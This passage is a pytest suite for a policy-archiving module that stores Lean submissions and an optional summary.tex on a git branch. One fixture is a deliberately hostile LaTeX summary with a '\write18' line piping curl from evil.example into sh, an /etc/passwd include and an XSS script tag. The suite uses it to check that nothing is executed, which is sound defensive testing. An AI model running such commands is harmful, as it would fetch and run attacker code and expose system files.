"""archive_policy: the accepted policy goes to the `submission-results` branch before it is published. Runs with plain git (a local bare repository
stands in for GitHub): python -m pytest test_archive_policy.py -q  (from evaluation/)."""
import base64
import json
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
import archive_policy as ap  # noqa: E402

HEAD = "ab" * 20
SOURCE = "namespace PolicySubmission\n-- the file\n"


def git(cwd, *args):
    return subprocess.run(["git", "-C", str(cwd), *args], check=True, text=True, capture_output=True).stdout.strip()


@pytest.fixture
def remote(tmp_path):
    """A bare `origin` whose `submission-results` branch already holds the table-generation index and one old entry."""
    bare = tmp_path / "origin.git"
    seed = tmp_path / "seed"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
    subprocess.run(["git", "init", "-q", "-b", ap.BRANCH, str(seed)], check=True)
    (seed / "leaderboard").mkdir()
    (seed / "leaderboard/results.json").write_text(json.dumps({"schema_version": 3, "challenge": "table-generation", "policies": [{"policy_id": "c" * 40}]}))
    git(seed, "add", "-A")
    git(seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "seed")
    git(seed, "remote", "add", "origin", str(bare))
    git(seed, "push", "-q", "origin", ap.BRANCH)
    clone = tmp_path / "clone"
    subprocess.run(["git", "clone", "-q", str(bare), str(clone)], check=True)
    return bare, clone


def verification(source=SOURCE, digest="d" * 16, created="2026-11-08T10:00:00Z"):
    return {"digest": digest, "mode": "pair", "board": "pp", "policy": {"bands": []}, "createdAt": created, "envelope": {"record": {"verdict": "accepted"}},
            "leanSource": source, "leanSha256": ap.sha256(source)}


def archive(clone, v=None, head=HEAD, source=SOURCE, login="tester", **kw):
    return ap.archive_policy(clone, v or verification(), login=login, pull=7, head_sha=head, run_id="99", source=source, **kw)


def test_a_policy_is_pushed_with_its_source_and_a_separate_index(remote):
    bare, clone = remote
    out = archive(clone)
    assert out["added"] is True and out["path"] == f"results/policy-submissions/{HEAD}"
    assert git(bare, "rev-parse", ap.BRANCH) == out["commit"]
    show = lambda p: git(bare, "show", f"{ap.BRANCH}:{p}")
    assert show(f"{out['path']}/Policy.lean") + "\n" == SOURCE
    index = json.loads(show(ap.INDEX_PATH))
    assert [p["policy_id"] for p in index["policies"]] == [HEAD]
    assert index["policies"][0]["source"] == {"repository": ap.REPOSITORY, "pr_number": 7, "github_login": "tester", "run_id": "99", "created_at": "2026-11-08T10:00:00Z"}
    assert "leanSource" not in json.loads(show(f"{out['path']}/verification.json")), "the source is stored once, as Policy.lean"
    assert json.loads(show("leaderboard/results.json"))["policies"] == [{"policy_id": "c" * 40}], "the table-generation index is untouched"


def test_publish_v2_reads_the_accepted_ids_from_both_indexes(remote, monkeypatch):
    _, clone = remote
    archive(clone)
    import publish_v2
    monkeypatch.setattr(publish_v2, "refresh_archive", lambda path: (clone, "r" * 40))
    ids, revision = publish_v2._archive_view(clone)
    assert ids == sorted(["c" * 40, HEAD]) and revision == "r" * 40


def test_archiving_twice_is_a_no_op_and_changing_the_file_is_refused(remote):
    bare, clone = remote
    first = archive(clone)
    again = archive(clone)
    assert again["added"] is False and again["commit"] == first["commit"] == git(bare, "rev-parse", ap.BRANCH)
    other = "namespace PolicySubmission\n-- another\n"
    with pytest.raises(ap.ArchiveRefused, match="different policy"):
        archive(clone, verification(other, digest="e" * 16), source=other)


def test_a_source_that_is_not_the_file_at_the_head_commit_is_refused(remote):
    bare, clone = remote
    before = git(bare, "rev-parse", ap.BRANCH)
    with pytest.raises(ap.ArchiveRefused, match="head commit"):
        archive(clone, verification("namespace PolicySubmission\n-- forged\n"))     # the verification says one thing, GitHub's file another
    v = verification()
    v["leanSha256"] = "0" * 64
    with pytest.raises(ap.ArchiveRefused):
        archive(clone, v)
    assert git(bare, "rev-parse", ap.BRANCH) == before, "nothing was pushed"


def test_a_verification_without_lean_source_cannot_be_archived(remote):
    _, clone = remote
    v = verification()
    del v["leanSource"], v["leanSha256"]
    with pytest.raises(ap.ArchiveRefused):
        archive(clone, v)
    with pytest.raises(ap.ArchiveRefused, match="40-hex"):
        archive(clone, head="abc")


def test_a_competing_push_is_retried_from_the_new_tip(remote, tmp_path, monkeypatch):
    bare, clone = remote
    rival = tmp_path / "rival"
    subprocess.run(["git", "clone", "-q", str(bare), str(rival)], check=True)
    git(rival, "checkout", "-q", ap.BRANCH)
    other_head = "cd" * 20
    ap.write_policy(rival, verification("namespace PolicySubmission\n-- rival\n", digest="f" * 16, created="2026-11-08T09:00:00Z"), login="rival", pull=6,
                    head_sha=other_head, run_id="98", source="namespace PolicySubmission\n-- rival\n")
    git(rival, "add", "-A")
    git(rival, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "rival")
    # the rival lands between `clone`'s first fetch and its push, so that push is rejected and must be retried from the new tip
    real, raced = ap._git, []
    def racing(checkout, *args, **kw):
        result = real(checkout, *args, **kw)
        if args[0] == "fetch" and not raced:
            raced.append(1)
            git(rival, "push", "-q", "origin", ap.BRANCH)
        return result
    monkeypatch.setattr(ap, "_git", racing)
    out = archive(clone)
    assert out["added"] is True
    ids = ap.policy_ids(clone)
    assert sorted(ids) == sorted([HEAD, other_head]), "both archives are on the branch; neither overwrote the other"
    assert git(bare, "rev-parse", ap.BRANCH) == out["commit"]


def test_github_source_decodes_the_contents_api_and_refuses_anything_else():
    calls = []
    def request(url, token, payload=None):
        calls.append((url, token))
        return {"encoding": "base64", "content": base64.encodebytes(SOURCE.encode()).decode()}
    assert ap.github_source(HEAD, "tok", request) == SOURCE
    assert calls == [(f"https://api.github.com/repos/{ap.REPOSITORY}/contents/{ap.SOURCE_PATH}?ref={HEAD}", "tok")]
    with pytest.raises(ap.ArchiveRefused):
        ap.github_source(HEAD, "tok", lambda *a, **k: {"type": "dir"})


# ---- the optional summary.tex: archived verbatim beside the policy, bound to the head commit in both directions, never interpreted
HOSTILE = ("\\documentclass{article}\n\\immediate\\write18{curl http://evil.example | sh}\n\\input{/etc/passwd}\n@everyone @octocat <script>alert(1)</script> ![x](http://e/x.png)\n"
           + "x" * 60000 + "\r\n\ttab and CRLF kept \u00e9\u2211\n")


def with_summary(text=HOSTILE, **kw):
    v = verification(**kw)
    v.update(summarySource=text, summarySha256=ap.sha256(text), summaryBytes=len(text.encode()))
    return v


def show_bytes(bare, path):
    return subprocess.run(["git", "-C", str(bare), "show", f"{ap.BRANCH}:{path}"], check=True, capture_output=True).stdout


def test_a_summary_is_archived_byte_for_byte_and_recorded_in_the_index(remote):
    bare, clone = remote
    out = archive(clone, with_summary(), summary=HOSTILE)
    assert out["added"] is True
    assert show_bytes(bare, f"{out['path']}/summary.tex") == HOSTILE.encode(), "verbatim, CRLF and all: nothing was interpreted, rendered or normalised"
    assert show_bytes(bare, f"{out['path']}/Policy.lean") == SOURCE.encode()
    index = json.loads(show_bytes(bare, ap.INDEX_PATH))
    assert index["policies"][0]["summarySha256"] == ap.sha256(HOSTILE)
    stored = json.loads(show_bytes(bare, f"{out['path']}/verification.json"))
    assert "summarySource" not in stored and "leanSource" not in stored, "each text is stored once, as its own file"
    assert stored["summarySha256"] == ap.sha256(HOSTILE) and stored["summaryBytes"] == len(HOSTILE.encode())
    changed = git(bare, "show", "--name-only", "--format=", ap.BRANCH).splitlines()
    assert sorted(changed) == sorted([ap.INDEX_PATH, f"{out['path']}/Policy.lean", f"{out['path']}/policy.json", f"{out['path']}/summary.tex", f"{out['path']}/verification.json"])


def test_a_policy_without_a_summary_archives_exactly_as_before(remote):
    bare, clone = remote
    out = archive(clone)
    assert "summarySha256" not in json.loads(show_bytes(bare, ap.INDEX_PATH))["policies"][0]
    names = git(bare, "ls-tree", "-r", "--name-only", ap.BRANCH, out["path"]).splitlines()
    assert not any(n.endswith("summary.tex") for n in names)


def test_archiving_a_summary_twice_is_a_no_op_and_a_changed_summary_is_refused(remote):
    bare, clone = remote
    first = archive(clone, with_summary(), summary=HOSTILE)
    again = archive(clone, with_summary(), summary=HOSTILE)
    assert again["added"] is False and again["commit"] == first["commit"] == git(bare, "rev-parse", ap.BRANCH)
    other = "another summary\n"
    with pytest.raises(ap.ArchiveRefused, match="different policy"):
        archive(clone, with_summary(other), summary=other)                  # same head, same policy, a different summary
    with pytest.raises(ap.ArchiveRefused, match="different policy"):
        archive(clone)                                                      # same head re-run without the summary
    assert git(bare, "rev-parse", ap.BRANCH) == first["commit"]


def test_the_verification_and_the_head_commit_must_agree_on_the_summary_in_both_directions(remote):
    bare, clone = remote
    before = git(bare, "rev-parse", ap.BRANCH)
    with pytest.raises(ap.ArchiveRefused, match="does not carry"):
        archive(clone, verification(), summary="on the head only\n")        # a summary the verification never saw
    with pytest.raises(ap.ArchiveRefused, match="does not have"):
        archive(clone, with_summary("only in the artifact\n"), summary=None)  # a summary the head commit does not have
    with pytest.raises(ap.ArchiveRefused, match="not the file at the pull request"):
        archive(clone, with_summary("verified text\n"), summary="head text\n")
    forged = with_summary("same\n")
    forged["summarySha256"] = "0" * 64
    with pytest.raises(ap.ArchiveRefused, match="not the file at the pull request"):
        archive(clone, forged, summary="same\n")
    stray = verification()
    stray["summarySha256"] = ap.sha256("x")                                 # a hash with no text, and nothing at the head
    with pytest.raises(ap.ArchiveRefused, match="does not have"):
        archive(clone, stray, summary=None)
    assert git(bare, "rev-parse", ap.BRANCH) == before, "nothing was pushed"


def test_a_summary_that_breaks_a_rule_is_refused_whatever_the_verification_says(remote):
    bare, clone = remote
    before = git(bare, "rev-parse", ap.BRANCH)
    for bad, why in (("a\x00b\n", r"U\+0000"), ("a" * 102401, "limit"), ("  \n", "empty")):
        with pytest.raises(ap.ArchiveRefused, match=why):
            archive(clone, with_summary(bad), summary=bad)
    assert git(bare, "rev-parse", ap.BRANCH) == before


def test_github_summary_is_none_only_for_a_404_and_refuses_what_is_not_a_text_file():
    def contents(data):
        return lambda url, token, payload=None: data
    good = {"type": "file", "encoding": "base64", "content": base64.encodebytes(HOSTILE.encode()).decode()}
    assert ap.github_summary(HEAD, "tok", contents(good)) == HOSTILE
    urls = []
    ap.github_summary(HEAD, "tok", lambda url, token, payload=None: urls.append(url) or good)
    assert urls == [f"https://api.github.com/repos/{ap.REPOSITORY}/contents/TableGeneration/Submission/summary.tex?ref={HEAD}"]

    def missing(url, token, payload=None):
        raise RuntimeError("Publisher rejected the request: HTTP 404; inspect the publisher logs")
    assert ap.github_summary(HEAD, "tok", missing) is None
    for status in ("403", "500"):
        def broken(url, token, payload=None, status=status):
            raise RuntimeError(f"Publisher rejected the request: HTTP {status}; inspect the publisher logs")
        with pytest.raises(RuntimeError, match=status):                     # an outage or a permission problem is never read as "no summary"
            ap.github_summary(HEAD, "tok", broken)
    for odd in ([{"type": "file", "name": "summary.tex"}],                  # a directory listing
                {"type": "symlink", "target": "/etc/passwd"},
                {"type": "submodule"},
                {"type": "file", "encoding": "none", "content": ""}):
        with pytest.raises(ap.ArchiveRefused):
            ap.github_summary(HEAD, "tok", contents(odd))
    bad = {"type": "file", "encoding": "base64", "content": base64.encodebytes(b"caf\xe9\n").decode()}
    with pytest.raises(ap.ArchiveRefused, match="UTF-8"):
        ap.github_summary(HEAD, "tok", contents(bad))


def test_the_archive_never_runs_anything_for_the_summary(remote, monkeypatch):
    """The only subprocesses are git's; the summary text is written as bytes and never passed to one."""
    _, clone = remote
    started = []
    real = subprocess.run

    def recording(cmd, *a, **k):
        started.append(list(cmd))
        return real(cmd, *a, **k)
    monkeypatch.setattr(ap.subprocess, "run", recording)
    archive(clone, with_summary(), summary=HOSTILE)
    assert started and all(c[0] == "git" for c in started)
    assert not any("write18" in part for c in started for part in c)


# ---- the same policy twice: refused for one participant, identified (and allowed) for another

HEAD2 = "cd" * 20
SOURCE2 = "namespace PolicySubmission\n-- the same policy, other comments\n"


def tip(bare):
    return git(bare, "rev-parse", ap.BRANCH)


def test_the_same_participant_cannot_archive_the_same_policy_twice(remote):
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    with pytest.raises(ap.DuplicatePolicy, match="already submitted") as refused:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2)
    assert refused.value.duplicate_of == {"policyId": HEAD, "login": "tester", "pull": 7, "createdAt": "2026-11-08T10:00:00Z", "sameParticipant": True}
    assert tip(bare) == before, "nothing was pushed"


def test_login_case_does_not_make_a_different_participant(remote):
    _, clone = remote
    archive(clone)
    with pytest.raises(ap.DuplicatePolicy):
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, login="TESTER")


def test_another_participant_with_the_same_policy_is_archived_and_identified(remote):
    bare, clone = remote
    archive(clone)
    got = archive(clone, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, login="other")
    assert got["added"] is True
    assert got["duplicates"] == [{"policyId": HEAD, "login": "tester", "pull": 7, "createdAt": "2026-11-08T10:00:00Z", "sameParticipant": False}]
    index = json.loads(git(bare, "show", f"{ap.BRANCH}:{ap.INDEX_PATH}"))
    assert [p["policy_id"] for p in index["policies"]] == [HEAD, HEAD2]


def test_a_first_submission_has_no_duplicates(remote):
    _, clone = remote
    assert archive(clone)["duplicates"] == []


def test_the_same_head_is_still_a_no_op_not_a_duplicate(remote):
    _, clone = remote
    archive(clone)
    again = archive(clone)
    assert again["added"] is False and again["duplicates"] == []


def test_the_same_digest_on_another_mode_is_not_a_duplicate(remote):
    _, clone = remote
    archive(clone)
    other = verification(SOURCE2)
    other["mode"], other["board"] = "triple", "ptp"
    assert archive(clone, other, head=HEAD2, source=SOURCE2)["added"] is True


def test_the_rule_table_decides(remote, monkeypatch):
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    monkeypatch.setitem(ap.DUPLICATE_RULES, "other_participant", "refuse")
    with pytest.raises(ap.DuplicatePolicy) as refused:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, login="other")
    assert refused.value.duplicate_of["sameParticipant"] is False and tip(bare) == before
    monkeypatch.setitem(ap.DUPLICATE_RULES, "same_participant", "allow")
    assert archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, login="tester")["added"] is True


def test_a_policy_that_was_archived_but_never_published_does_not_block_a_retry(remote):
    """The archive is written before the publisher is called, so a failed publication leaves an archived head with no row. A new commit with the same policy must go through."""
    bare, clone = remote
    archive(clone)                                                     # HEAD is archived, and the publisher never published it
    got = archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, published_ids={"f" * 40})
    assert got["added"] is True and got["duplicates"] == []


def test_a_published_repeat_is_refused_when_the_published_ids_are_given(remote):
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    with pytest.raises(ap.DuplicatePolicy) as refused:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, published_ids={HEAD, "f" * 40})
    assert refused.value.duplicate_of["policyId"] == HEAD and tip(bare) == before


def test_another_participants_unpublished_copy_is_not_reported_as_a_repeat(remote):
    _, clone = remote
    archive(clone, login="other")
    got = archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, published_ids=set())
    assert got["added"] is True and got["duplicates"] == []


# ---- the readout planner: the same policy measured the other way is a variant of it, not a repeat of it

def archived_entry(index, digest="d" * 16, login="tester", mode="pair", created="2026-11-08T10:00:00Z", **extra):
    index["policies"].append({"policy_id": "ef" * 20, "digest": digest, "mode": mode,
                              "source": {"pr_number": 1, "github_login": login, "created_at": created}, **extra})
    return index


def plain(tmp_path, name="archive"):
    """A checkout with nothing but the index's folder: `write_policy` on its own, without git or a remote."""
    checkout = tmp_path / name
    (checkout / ap.INDEX_PATH).parent.mkdir(parents=True)
    return checkout


def put(checkout, v=None, head=HEAD, source=SOURCE, login="tester", pull=7, run_id="99", **kw):
    return ap.write_policy(checkout, v or verification(), login=login, pull=pull, head_sha=head, run_id=run_id, source=source, **kw)


def entry_of(checkout, head):
    return next(p for p in ap.read_index(checkout)["policies"] if p["policy_id"] == head)


#: `write_policy`'s index for one ordinary coherent submission, as it has always written it (git blob 650b2416, submission tree 9f99f79f).
LEGACY_INDEX = ('{\n "schema": "forshor.policy-archive/v1",\n "policies": [\n  {\n'
                '   "policy_id": "abababababababababababababababababababab",\n   "digest": "dddddddddddddddd",\n'
                '   "mode": "pair",\n   "board": "pp",\n'
                '   "sha256": "de52165f0717eb98cd744a4399ec1eb44406045448822c1b16142d5e7fdb46ca",\n'
                '   "path": "results/policy-submissions/abababababababababababababababababababab",\n'
                '   "source": {\n    "repository": "zapatacomputing/forshor-submissions",\n    "pr_number": 7,\n'
                '    "github_login": "tester",\n    "run_id": "99",\n    "created_at": "2026-11-08T10:00:00Z"\n   }\n  }\n ]\n}\n')


def test_the_coherent_default_is_byte_identical_to_what_the_archive_already_holds(remote, tmp_path):
    # Fails if an ordinary coherent entry gains `readout`, `boards` or any other key, or is reordered or reformatted:
    # every row already on `submission-results` was written by this path and its id must not move.
    bare, clone = remote
    out = archive(clone)
    assert show_bytes(bare, ap.INDEX_PATH) == LEGACY_INDEX.encode()
    assert git(bare, "rev-parse", f"{ap.BRANCH}:{ap.INDEX_PATH}") == "650b24166dfd41f07f2baf585718eba7d6dd046f"
    assert git(bare, "rev-parse", f"{ap.BRANCH}:{out['path']}") == "9f99f79f7062654110969060e1f677c9b4899ebc"
    put(plain(tmp_path, "explicit"), readout="coherent")
    assert (tmp_path / "explicit" / ap.INDEX_PATH).read_bytes() == LEGACY_INDEX.encode(), "the explicit default is the omitted default"


@pytest.mark.parametrize("first,second", [("coherent", "semiclassical"), ("semiclassical", "coherent")])
def test_your_own_policy_with_the_other_readout_is_a_full_only_variant(first, second, tmp_path):
    # Fails if write_policy refuses a same-participant repeat straight from find_duplicates/DUPLICATE_RULES instead of
    # routing it through plan_readout_variant, which answers with the earlier entry's id: the other readout is a variant of it.
    checkout = plain(tmp_path)
    assert put(checkout, readout=first) is True
    assert put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, readout=second) is True
    earlier, variant = entry_of(checkout, HEAD), entry_of(checkout, HEAD2)
    assert variant["readout"] == second and variant["boards"] == ["full"], "the variant prices the full board; the primitive stays with the earlier entry"
    if first == "coherent":
        assert "readout" not in earlier and "boards" not in earlier, "the legacy coherent entry is read as it is, never backfilled"
    else:
        assert earlier["readout"] == first and earlier["boards"] == ["pp", "full"], "a first measured submission is its own primitive"


@pytest.mark.parametrize("first,second", [("coherent", "semiclassical"), ("semiclassical", "coherent")])
def test_the_archive_reports_which_entry_a_variant_derives_from_and_its_boards(first, second, tmp_path):
    # Fails if write_policy plans the variant and keeps the answer to itself: the published request must carry the same
    # boards as the entry (`primitiveFrom`, boards == ["full"]), and only this return path can tell the caller.
    checkout = plain(tmp_path)
    ours, theirs = {}, {}
    assert put(checkout, readout=first, variant=ours) is True
    assert ours == {"boards": ["pp", "full"], "primitiveFrom": None}, "a first copy is its own primitive on both boards"
    assert put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, readout=second, variant=theirs) is True
    assert theirs == {"boards": ["full"], "primitiveFrom": HEAD}
    again = {}
    assert put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, readout=second, variant=again) is False
    assert again == theirs, "an archived-already rerun reports the same variant, so a retried publication prices the same boards"


def test_archive_policy_returns_the_variant_next_to_the_commit(remote):
    bare, clone = remote
    first = archive(clone, readout="semiclassical")
    assert first["boards"] == ["pp", "full"] and first["primitiveFrom"] is None
    second = archive(clone, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, published_ids={HEAD})
    assert second["added"] is True and second["boards"] == ["full"] and second["primitiveFrom"] == HEAD
    assert second["commit"] == git(bare, "rev-parse", ap.BRANCH)


@pytest.mark.parametrize("readout", ["coherent", "semiclassical"])
def test_the_same_policy_with_the_same_readout_is_still_a_repeat(readout, tmp_path):
    # Fails if the routing only reads plan_readout_variant's return value and swallows its DuplicatePolicy.
    checkout = plain(tmp_path)
    put(checkout, readout=readout)
    before = (checkout / ap.INDEX_PATH).read_bytes()
    with pytest.raises(ap.DuplicatePolicy, match="already submitted") as refused:
        put(checkout, verification(SOURCE2), head=HEAD2, source=SOURCE2, readout=readout)
    assert refused.value.duplicate_of["policyId"] == HEAD and refused.value.duplicate_of["sameParticipant"] is True
    assert (checkout / ap.INDEX_PATH).read_bytes() == before, "the refused repeat wrote nothing"


def test_the_rule_table_still_decides_a_same_readout_repeat(tmp_path, monkeypatch):
    # Fails if the routing calls a same-readout repeat a variant (boards ["full"]) rather than leaving it to DUPLICATE_RULES.
    checkout = plain(tmp_path)
    put(checkout, readout="semiclassical")
    monkeypatch.setitem(ap.DUPLICATE_RULES, "same_participant", "allow")
    repeats = []
    assert put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
               readout="semiclassical", duplicates=repeats) is True
    assert [(r["policyId"], r["sameParticipant"]) for r in repeats] == [(HEAD, True)]
    assert entry_of(checkout, HEAD2)["boards"] == ["pp", "full"], "an allowed repeat is not a variant and inherits no primitive"


def test_an_unknown_readout_is_refused_and_writes_nothing(tmp_path):
    # Fails if write_policy accepts a readout name without asking the planner, which is the only check of it.
    checkout = plain(tmp_path)
    with pytest.raises(ap.ArchiveRefused, match="unknown readout design"):
        put(checkout, readout="measured")
    assert ap.read_index(checkout)["policies"] == [] and not (checkout / ap.DIR).exists()


def test_another_participants_readout_variant_is_still_only_identified(remote):
    # Fails if the readout routing reaches other participants: DUPLICATE_RULES must keep deciding for them, and their
    # measured submission is its own primitive, not a variant of a policy they do not own.
    bare, clone = remote
    archive(clone)
    got = archive(clone, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
                  login="other", readout="semiclassical")
    assert got["added"] is True
    assert [(d["policyId"], d["sameParticipant"]) for d in got["duplicates"]] == [(HEAD, False)]
    assert entry_of(clone, HEAD2)["boards"] == ["pp", "full"] and entry_of(clone, HEAD2)["readout"] == "semiclassical"


def test_the_planner_reads_the_mode_it_is_given(remote):
    # Fails if plan_readout_variant pins mode="PhaseProduct" again: write_policy must be able to ask about the mode it is archiving.
    index = archived_entry({"policies": []})
    binding = dict(digest="d" * 16, login="tester", head_sha=HEAD, published_ids={"ef" * 20})
    assert ap.plan_readout_variant(index, **binding, readout="semiclassical") is None, "the default mode is still PhaseProduct"
    assert ap.plan_readout_variant(index, **binding, readout="semiclassical", mode="pair") == "ef" * 20
    with pytest.raises(ap.DuplicatePolicy):
        ap.plan_readout_variant(index, **binding, readout="coherent", mode="pair")


# ---- the primitive and design entry kinds: a standalone synthesis primitive and a QFT design are results of the
# ---- same policy, exactly as the readout is, and the archive is the only durable record of either.

B2, B3 = "catalyticB2", "adaptiveB3"
#: A QFT design as `qft_overlay.parse_design` receives it, in the shape `full_run_design` hands over
#: (`Gate5Design.lean`'s `QftChoice.json` per family). Two designs that differ, for the variant rules.
BANDED = {"data": {"backend": "ross_selinger", "target": "approximate", "max_error": "1e-6"}}
CATALYTIC = {"data": {"backend": "catalytic", "target": "exact"}}


def ptp(source=SOURCE, **kw):
    v = verification(source, **kw)
    v["mode"], v["board"] = "triple", "ptp"
    return v


def test_the_explicit_default_of_every_axis_is_the_omitted_default(tmp_path):
    # Fails if write_policy writes `readout`, `boards`, `primitive`, `tKind` or `design` for a submission that
    # asked for none of them: every row already on `submission-results` was written by this path (git blob 650b2416,
    # submission tree 9f99f79f, pinned above), and none of them may move.
    put(plain(tmp_path), readout="coherent", primitive=None, design=None)
    assert (tmp_path / "archive" / ap.INDEX_PATH).read_bytes() == LEGACY_INDEX.encode()


def test_the_archive_names_exactly_the_primitives_the_overlay_prices_and_no_default():
    # Fails if PRIMITIVE_T_SITE_KIND drifts from export_v2.primitive_overlay -- if the archive admits a primitive the
    # overlay does not price, or records rossSelinger as a value rather than as the absence of the key.
    # The primitive -> kind binding itself was measured against the four primitive receipts on the pinned interpreter:
    # catalyticB2 rankedT 26,478,500 (pp) / 97,329,643 (ptp), tKind "deterministic"; adaptiveB3 143,366,613 (pp) /
    # 140,780,047 (ptp), tKind "expectedAdaptive". A fast test cannot reprice, so the names are pinned here and the
    # pair is enforced structurally by check_entry.
    from export_v2 import primitive_overlay as overlay
    assert sorted(ap.PRIMITIVE_T_SITE_KIND) == sorted(overlay.PRIMITIVE_OF.values())
    assert overlay.DEFAULT_PRIMITIVE not in ap.PRIMITIVE_T_SITE_KIND, "the default stamps nothing: it is no key at all"
    source = Path(overlay.__file__).read_text()
    for kind in ap.PRIMITIVE_T_SITE_KIND.values():
        assert f'kind = "{kind}"' in source, f"the overlay no longer prices a {kind} T"
    assert set(ap.PRIMITIVE_T_SITE_KIND.values()) == {"deterministic", "expectedAdaptive"}


@pytest.mark.parametrize("primitive,kind", sorted(ap.PRIMITIVE_T_SITE_KIND.items()))
def test_a_primitive_bearing_entry_names_the_primitive_and_what_kind_of_number_its_T_is(primitive, kind, tmp_path):
    # Fails if write_policy drops the `primitive` / `tKind` block, or records a number. adaptiveB3's T is an
    # UNCONDITIONAL EXPECTATION and catalyticB2's is deterministic; the overlay makes the two uncollapsible in the price
    # (no bare T, tKind plus exactly one of tDeterministic/tExpectedAdaptive) and the archive is where the result is
    # kept forever, so a row that flattened it would lose the distinction for good.
    checkout = plain(tmp_path)
    assert put(checkout, primitive=primitive) is True
    entry = entry_of(checkout, HEAD)
    assert entry["primitive"] == primitive and entry["tKind"] == kind
    assert entry["boards"] == ["pp", "full"], "a first copy of the policy is its own primitive, on both its boards"
    assert not [k for k in ap.BARE_PRICE_KEYS if k in entry], "the archive records which result, never the number"


@pytest.mark.parametrize("primitive,kind", sorted(ap.PRIMITIVE_T_SITE_KIND.items()))
def test_the_per_site_axis_is_recorded_as_tKind_and_under_no_other_key(primitive, kind, tmp_path):
    """The per-site axis (deterministic / expectedAdaptive) is recorded as
    `tKind`, because it is structurally enforced and reaches production -- no bare `T`, exactly one of
    `tDeterministic` / `tExpectedAdaptive`, re-checked in `mapping.standalone_price_of` and again by the
    published contract, whose primitive block is a union DISCRIMINATED on `tKind` with that same vocabulary.

    An earlier draft recorded the axis as `tSiteKind`. Fails if `write_policy` writes it under that name
    again, or under any key other than `tKind`."""
    checkout = plain(tmp_path)
    put(checkout, primitive=primitive)
    entry = entry_of(checkout, HEAD)
    assert entry["tKind"] == kind, "the per-site axis is recorded as tKind"
    assert "tSiteKind" not in entry, "the earlier name for the per-site axis is gone from the archive"
    assert "tClaimKind" not in entry, "an entry records the per-site T kind as tKind and under no other key"
    # And the refusal moved with the key: an entry naming the axis the old way is a contradicted T kind, not
    # an accepted one, so a half-applied rename cannot pass check_entry.
    with pytest.raises(ap.ArchiveRefused, match="never the same claim"):
        ap.check_entry({"policy_id": HEAD, "primitive": primitive, "tSiteKind": kind})


@pytest.mark.parametrize("first,second", [(None, B2), (B2, None), (B2, B3), (B3, B2)])
def test_your_own_policy_with_another_primitive_is_a_standalone_only_variant(first, second, tmp_path):
    # Fails if plan_readout_variant compares on the readout alone (`chosen == readout`) instead of on the whole
    # result kind: a different synthesis primitive would then be refused as a repeat of the policy it re-prices.
    # Both arrival orders, including arriving before and after the plain default entry.
    checkout = plain(tmp_path)
    assert put(checkout, primitive=first) is True
    assert put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
               primitive=second) is True
    earlier, variant = entry_of(checkout, HEAD), entry_of(checkout, HEAD2)
    assert variant.get("primitive") == second and variant["boards"] == ["pp"], \
        "a primitive re-prices the standalone board only -- the full order-finding board takes no primitive"
    assert variant["readout"] == "coherent", "the readout axis is untouched by a primitive variant"
    if first is None:
        assert "primitive" not in earlier and "boards" not in earlier, "the legacy default entry is never backfilled"
    else:
        assert earlier["primitive"] == first and earlier["boards"] == ["pp", "full"]


def test_a_readout_variant_and_a_primitive_variant_divide_the_boards_the_other_way(tmp_path):
    # Fails if variant_boards stops reading AXIS_BOARD and hard-codes one half: the readout re-prices the full run and
    # surrenders the standalone row to the earlier entry, a primitive does exactly the reverse.
    for name, axis, boards in (("readout", {"readout": "semiclassical"}, ["full"]), ("primitive", {"primitive": B2}, ["pp"])):
        checkout = plain(tmp_path, name)
        put(checkout)
        put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, **axis)
        assert entry_of(checkout, HEAD2)["boards"] == boards, name


def test_a_primitive_that_also_changes_the_full_run_is_its_own_primitive_on_both_boards(tmp_path):
    # Fails if the boards are read off one axis rather than the union: an entry that re-prices BOTH rows surrenders
    # nothing to the earlier entry, so it is its own base and names both boards.
    checkout = plain(tmp_path)
    put(checkout)
    put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
        primitive=B2, design=BANDED)
    assert entry_of(checkout, HEAD2)["boards"] == ["pp", "full"]


@pytest.mark.parametrize("primitive", [None, B2, B3])
def test_the_same_policy_with_the_same_primitive_is_still_a_repeat(primitive, tmp_path):
    # Fails if the generalised comparison stops raising DuplicatePolicy when every axis agrees -- the repeat
    # DUPLICATE_RULES have always refused.
    checkout = plain(tmp_path)
    put(checkout, primitive=primitive)
    before = (checkout / ap.INDEX_PATH).read_bytes()
    with pytest.raises(ap.DuplicatePolicy, match="already submitted") as refused:
        put(checkout, verification(SOURCE2), head=HEAD2, source=SOURCE2, primitive=primitive)
    assert refused.value.duplicate_of["policyId"] == HEAD and refused.value.source == "the readout variant planner"
    assert (checkout / ap.INDEX_PATH).read_bytes() == before, "the refused repeat wrote nothing"
    assert not (checkout / ap.DIR / HEAD2).exists()


def test_a_phase_triple_product_primitive_occupies_its_own_board_and_never_the_full_run(tmp_path):
